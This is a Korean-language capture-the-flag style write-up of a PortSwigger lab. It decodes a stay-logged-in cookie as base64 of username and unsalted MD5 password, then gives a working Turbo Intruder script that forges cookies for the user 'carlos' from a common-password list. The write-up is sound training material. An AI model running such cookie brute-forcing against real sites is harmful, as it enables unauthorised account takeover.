# 🚩Lab: Brute-forcing a stay-logged-in cookie

```text
This lab allows users to stay logged in even after they close their browser session.
The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his My account page.

Your credentials: wiener:peter
Victim's username: carlos
```

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인해본다. 이때 stay-logged-in 기능을 체크한다.
```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=PVw1XqoFjPAJxBhg8MGJKhxGBu6rHM6u; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
2. `stay-logged-in` 쿠키가 할당된다. 해당 쿠키를 base64 디코딩하면 `wiener:51dc30ddc473d43a6011e9ebba6ca770` 라는 값이 나온다.
3. `51dc30ddc473d43a6011e9ebba6ca770`라는 값은 32글자로 `MD5 해시`를 사용하였을 것이라고 추측된다.
4. 혹시나 이미 알려진 해시값인지 레인보우 테이블을 조회해본다. 이때 외부 사이트인 [crackstation](https://crackstation.net/) 를 사용하였다.
5. 조회 결과 = `51dc30ddc473d43a6011e9ebba6ca770	md5	peter` 이다.
6. 따라서 `stay-logged-in` 쿠키의 값은 `base64encode(username:MD5(password))` 이다.
7. 해당 랩에서 제공되는 패스워드 후보들로 똑같이 조합하여 brute-force 공격을 진행해보자. 터보 인트루더로 진행하였다. 헤더에서 기존의 세션쿠키는 지우고 진행.

```http
GET /my-account?id=carlos HTTP/2
Host: 0aaf00e30457a7c3813a7bf500c7009c.web-security-academy.net
Cookie: stay-logged-in=%s;
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
```


```python
import base64
import hashlib


def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=50,
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )

  raw_passwords = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow"""

  passwords = [p.strip() for p in raw_passwords.split('\n') if p.strip()]

  for pw in passwords:
    md5_hash = hashlib.md5(pw.encode('utf-8')).hexdigest()
    cookie_val = 'carlos:{}'.format(md5_hash)
    b64_cookie = base64.b64encode(cookie_val.encode('utf-8')).decode('utf-8')

    engine.queue(target.req, b64_cookie)


def handleResponse(req, interesting):
  table.add(req)

```
8. table의 페이로드중 유일하게 302코드가 아닌 200코드를 반환하는 것이있다. 그게 바로 옳은 쿠키값이다.

> [!NOTE]
> 단순히 table.add 말고 if 'Log out' in req.response: table.add로 필터링을 추가해볼 수도 있음.
                        
### 💡 취약점 원리
 중요한 쿠키의 값에 단방향 해시를 쓰고 있긴 하지만 salt는 없어서 레인보우 테이블로 쉽게 값을 조회 할 수 있었음. 
